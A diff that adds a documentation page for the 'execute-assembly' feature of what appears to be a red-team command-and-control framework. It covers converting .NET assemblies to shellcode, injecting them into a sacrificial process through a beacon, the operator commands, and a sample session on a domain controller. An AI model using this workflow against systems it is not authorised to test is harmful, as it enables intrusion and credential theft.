@@ -1,0 +1,73 @@
+---
+title: Execute Assembly
+description: Fork-and-run .NET assembly execution path.
+---
+
+# Execute Assembly
+
+`execute-assembly` runs a .NET assembly through the fork-and-run path. The teamserver converts raw assembly bytes to shellcode with `python3-donut`, then the Windows beacon starts a sacrificial process, injects the shellcode, and captures output from that process.
+
+## Flow
+
+```text
+Operator selects assembly
+  -> POST /api/exec-assembly
+  -> teamserver converts to shellcode
+  -> teamserver queues TASK_EXEC_ASSEMBLY
+  -> beacon starts sacrificial process
+  -> beacon captures output
+  -> result returned to teamserver
+```
+
+## Inputs
+
+| Input | Description |
+| --- | --- |
+| Assembly | .NET executable bytes |
+| Args | Command-line arguments passed to the assembly |
+| SpawnTo | Sacrificial process path |
+
+## Assembly library
+
+Assemblies can be uploaded once and reused by name:
+
+- `assembly-upload <name>`
+- `assembly-list`
+- `assembly-delete <name>`
+- `execute-assembly <name> [args]`
+
+## Limits
+
+Assembly uploads are bounded by server-side body and reader limits. Large outputs may be truncated.
+
+## When to prefer inline-assembly
+
+Use `inline-assembly` when you explicitly want in-process CLR hosting. Use `execute-assembly` when process isolation is more important than staying in the beacon process.
+
+## Output
+
+The console first shows task metadata. Returned output is the target assembly's own stdout/stderr text.
+
+```text
+[BEBOP ~]$ execute-assembly Rubues.exe
+[*] select .NET assembly file...
+[*] assembly queued (label: 3827534869, shellcode: 24172 bytes)
+[+] task delivered to beacon
+[+] execute-assembly is working
+[+] hostname: DC
+[+] user: Administrator
+[+] domain: SUPPORT
+[+] os: Microsoft Windows NT 10.0.20348.0
+[+] x64: True
+[+] pid: 3796
+[*] no arguments passed
+```
+
+Beacon-side errors use the `exec-asm:` prefix:
+
+```text
+exec-asm: process creation failed
+exec-asm: injection failed
+exec-asm: thread creation failed
+exec-asm: timeout (120s)
+```
